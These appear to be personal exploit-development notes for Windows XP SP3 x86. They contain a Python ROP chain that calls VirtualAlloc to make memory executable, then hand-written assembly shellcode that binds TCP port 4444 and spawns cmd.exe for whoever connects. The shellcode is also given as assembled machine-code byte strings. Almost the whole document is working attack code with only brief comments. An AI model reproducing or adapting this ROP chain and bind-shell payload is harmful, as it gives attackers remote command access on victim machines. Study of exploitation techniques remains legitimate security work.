- environ

Windows XP SP3-x86-cd-vl-x14-74070

- rop
```python
rop += pack('<L',0x7c809ae1)	# VirtualAlloc
rop += pack('<L',0x4011fc)	# ADD ESP,0x4;POP EBP;RETN;
rop += pack('<L',0x0)			# WrittenAddr -> 0x0
rop += pack('<L',0x100)		# dwSize -> 0x100
rop += pack('<L',0x1000)		# flAllocationType ->MEM_COMMIT
rop += pack('<L',0x40)		# flProtect -> MEM_EXECUTE_READWRITE
rop += pack('<L',0x01010101)
rop += pack('<L',0x02020202)
rop += pack('<L',0x7c8409d4)	# ..XCHG EAX,EDX;RETN;				#arg0
rop += pack('<L',0x7c921726)	# MOV EAX,EDX;
rop += pack('<L',0x7c9259c8)	# XCHG EAX,EBX;RETN;
rop += pack('<L',0x7c96ef6b)	# POP EBP;RETN;
rop += pack('<L',0x0)
rop += pack('<L',0x7c87f229)	# POP EAX;RETN;
rop += pack('<L',0x401020)		# ..readbuf
rop += pack('<L',0x7c99123c)	# ..POP ECX;RETN;					#arg1
rop += pack('<L',0x400)
rop += pack('<L',0x7c922486)	# POP EDI;RETN;
rop += pack('<L',0x7c96fe65)	# RETN 0x8;
rop += pack('<L',0x7c94261e)	# POP ESI;RETN;
rop += pack('<L',0x7c974f40)	# JMP EAX;
rop += pack('<L',0x7c96d22b)	# PUSHAD;RETN;
rop += pack('<L',0x7c96fe65)	# RETN 0x8;
```

- shellcode
```asm
;my first shellcode of which function is to BIND 4444 and reverse shell
push 0x6c6c
push 0x642e3233
push 0x5f327377
mov eax,esp
push eax
mov eax,0x7c801d7b
call eax						;Load ws_32.dll
sub esp,400
push esp
push 0x101
mov eax,0x71a26a55
call eax						;WSAStartup(0x101,&data)
push 0
push 0
push 0
push 6
push 1
push 2
mov eax,0x71a28b6a
call eax						;WSASocketA(2,1,0,0,0,0)
mov ebx,eax;save socket fd
mov edx,2
push edx
dec edx
push edx
lea ecx,[esp]
mov edx,4
push ecx
push edx
mov edx,0xffff
push edx
push ebx
mov eax,0x71a24521
call eax						;setsockopt(fd,0xffff,4,&1,2)
push 0
push 0
push 0
push 0
mov [esp],BYTE 2
mov [esp+2],WORD 5c11
lea ecx,[esp]
push 0x10
push ecx
push ebx
mov eax,0x71a24480
call eax						;bind(fd,"4444",0x10)
push 1
push ebx
mov eax,0x71a28cd3
call eax						;listen(fd,1)
mov edx,0x10
push edx
lea edi,[esp]
push edi
push ecx
push ebx
mov eax,0x71a31040
call eax						;accept(fd,"4444",&0x10)
;Then CreateProcess!
cdq
mov edi,eax
sub esp,0x10
lea ebx,[esp]
push edi
push edi
push edi
push 0x10
push 0x10
mov edx,0xff
inc edx
push edx
cdq
push edx
push edx
push edx
push edx
push edx
push edx
push edx
push edx
push edx
push edx
mov edx,0x44
push edx
lea ecx,[esp]
cdq
push 0x657865
push 0x2e646d63
lea eax,[esp]
push ebx
push ecx
push edx
push edx
push edx
inc edx
push edx
cdq
push edx
push edx
push eax
push edx
mov eax,0x7c80236b
call eax						;CreateProcess cmd.exe
```

- machine code -> 
`hll\x00\x00h32.dhws2_\x8b\xc4P\xc7\xc0{\x1d\x80|\xff\xd0\x81\xec\x00\x04\x00\x00Th\x01\x01\x00\x00\xc7\xc0Uj\xa2q\xff\xd0j\x00j\x00j\x00j\x06j\x01j\x02\xc7\xc0j\x8b\xa2q\xff\xd0\x8b\xd8\xc7\xc2\x02\x00\x00\x00RJR\x8d\x0c$\xc7\xc2\x04\x00\x00\x00QR\xc7\xc2\xff\xff\x00\x00RS\xc7\xc0!E\xa2q\xff\xd0j\x00j\x00j\x00j\x00\xc6\x04$\x02f\xc7D$\x02\x11\\\x8d\x0c$j\x10QS\xc7\xc0\x80D\xa2q\xff\xd0j\x01S\xc7\xc0\xd3\x8c\xa2q\xff\xd0\xc7\xc2\x10\x00\x00\x00R\x8d<$WQS\xc7\xc0@\x10\xa3q\xff\xd0`
+
`\x99\x8b\xf8\x83\xec\x10\x8d\x1c$WWWj\x10j\x10\xc7\xc2\xff\x00\x00\x00BR\x99RRRRRRRRRR\xc7\xc2D\x00\x00\x00R\x8d\x0c$\x99hexe\x00hcmd.\x8d\x04$SQRRRBR\x99RRPR\xc7\xc0k#\x80|\xff\xd0`

